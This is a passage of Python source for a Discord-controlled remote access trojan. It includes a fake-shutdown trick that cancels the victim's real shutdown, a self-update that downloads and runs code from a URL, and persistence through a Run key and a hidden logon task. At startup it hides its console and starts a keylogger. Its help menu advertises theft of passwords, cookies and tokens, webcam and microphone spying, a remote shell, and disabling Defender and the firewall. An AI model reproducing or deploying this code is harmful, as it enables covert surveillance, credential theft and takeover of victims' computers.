# ============================================================
#  FAKE SHUTDOWN WATCH  (V4.1 — now actually works)
# ============================================================
@bot.command(name="shutdownwatch")
async def shutdownwatch(ctx, state: str = "on"):
    try:
        s = state.lower()
        if s == "on":
            open(FAKE_SHUTDOWN_FLAG, "w").write("1")
            open(SHUTDOWN_WATCHER, "w").write("1")
            _start_shutdown_watcher()
            await ctx.reply(
                "🕵️ fake shutdown guard **ON**\n"
                "when he clicks Start → Power → Shutdown, we cancel it and show a fake "
                "power-off screen. Use `!shutdownrestore` to bring the screen back."
            )
        elif s == "off":
            try: os.remove(FAKE_SHUTDOWN_FLAG)
            except: pass
            try: os.remove(SHUTDOWN_WATCHER)
            except: pass
            try: os.remove(FAKE_SHUTDOWN_ACTIVE)
            except: pass
            _stop_shutdown_watcher()
            kill_pid_file(BLACKOUT_PID)
            await ctx.reply("fake shutdown guard OFF")
        else:
            await ctx.reply("usage: `!shutdownwatch on|off`")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="shutdownrestore", aliases=["restoreshutdown"])
async def shutdownrestore(ctx):
    try:
        # Close only the fake-off overlay
        kill_pid_file(BLACKOUT_PID, tree=True)
        try: os.remove(FAKE_SHUTDOWN_ACTIVE)
        except: pass
        await ctx.reply("🔄 screen restored (real shutdown allowed again when pressing power)")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


# ============================================================
#  UPDATE / PERSIST
# ============================================================
@bot.command(name="update")
async def update_cmd(ctx, url: str):
    try:
        data = download_bytes(url, 30)
        target = os.path.abspath(sys.argv[0])
        if not target.lower().endswith((".py", ".pyw")):
            return await ctx.reply(f"running from {target}, can't self-replace. saving to work dir instead.")
        open(target, "wb").write(data)
        await ctx.reply(f"updated {len(data)} B → restarting in 2s (bot will be offline briefly)")
        await asyncio.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="persist-service")
async def persist_service(ctx):
    """
    Real Windows service (via sc) — for a real service you usually need to *move*
    the launcher into a service-shaped wrapper. We use scheduled task "ONLOGON"
    as the main persistence (already installed at startup); this command additionally
    registers a "HKCU Run" + a hidden scheduled task, and can be called repeatedly.
    """
    try:
        install_to_startup()
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        target = os.path.join(WORK_DIR, f"{APP_NAME}.pyw")
        cmd = f'"{pythonw}" "{target}"'
        run_ps(
            f'schtasks /Create /TN "{STARTUP_NAME}_svc" /TR "\'{cmd}\'" '
            f'/SC ONLOGON /RL HIGHEST /F | Out-Null'
        )
        await ctx.reply(f"persistence re-installed\n`{STARTUP_NAME}` (Run key)\n`{STARTUP_NAME}_svc` (logon task)")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="startup-check")
async def startup_check(ctx):
    try:
        out1 = run_ps(f'Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{STARTUP_NAME}" -ErrorAction SilentlyContinue | Format-List')
        out2 = run_ps(f'schtasks /Query /TN "{STARTUP_NAME}" /FO LIST 2>&1')
        await ctx.reply(f"**Registry Run key:**\n```\n{(out1 or '(none)')[:800]}\n```\n"
                        f"**Scheduled task:**\n```\n{(out2 or '(none)')[:800]}\n```")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


# ============================================================
#  HELP  (categorized)
# ============================================================
@bot.command(name="help", aliases=["commands", "cmds"])
async def help_cmd(ctx):
    embed = discord.Embed(title=f"{APP_NAME} — commands", color=0x5865F2)
    sections = {
        "Basic":       "`!ping` `!version` `!info` `!ip` `!battery` `!screenshot`/`!ss`",
        "Processes":   "`!processes` `!kill <name>` `!kill-tree <pid>`",
        "Files":       "`!files [path]` `!getfile <path>` `!sendfile <url|attach>` `!trash <path>` `!mkdir <path>` `!find <name>` `!imgzip [folder]` `!zip-pw <dir> <pw>` `!diskmap` `!empty-recycle`",
        "Execute":     "`!shell <cmd>` `!execute <path-or-cmd>` `!open <target>` `!openurl <url>` `!tabs <a,b,c>`",
        "Data":        "`!token` `!passwords`/`!pw` `!cookies`/`!ck` `!autofill` `!history [json|txt]` `!wifi`",
        "System":      "`!msg <text>` `!error [text]` `!restart` `!shutdown` `!logoff` `!lock` `!volume max|mute` `!cd` `!cdclose` `!clipboard`/`!clip`",
        "Media":       "`!webcam`/`!cam` `!cams` `!mics` `!mic <sec>`",
        "Keylogger":   "`!keylog start|stop|dump|clear`",
        "Trolls":      "`!type <text>` `!beep <sec>` `!shake <sec>` `!move <n>` `!wallpaper <url>` `!invert` `!uninvert` `!caps` `!num` `!blackout <sec>` `!unblackout` `!flash <sec>` `!hidebar` `!showbar` `!minimize-all` `!maximize-all` `!alt-tab <n>` `!taskview` `!freeze <sec>`",
        "System tweaks":"`!disable-defender` `!disable-firewall`",
        "Fake shutdown":"`!shutdownwatch on|off` `!shutdownrestore`",
        "Persistence": "`!update <url>` `!persist-service` `!startup-check`",
    }
    for name, body in sections.items():
        embed.add_field(name=name, value=body, inline=False)
    embed.set_footer(text=f"prefix: !  |  owner only  |  {APP_NAME} v4.1")
    await ctx.reply(embed=embed)


# ============================================================
#  MAIN
# ============================================================
def main():
    hide_self_console()
    try:
        install_to_startup()
    except Exception:
        pass
    # cheap, safe sanity checks
    try:
        if os.path.exists(KEYLOG_ON):
            _start_keylogger()
    except Exception:
        pass
    while True:
        try:
            bot.run(BOT_TOKEN, log_handler=None)
            break
        except Exception as e:
            log(f"bot.run crashed: {e} — restarting in 15s")
            time.sleep(15)


if __name__ == "__main__":
    main()
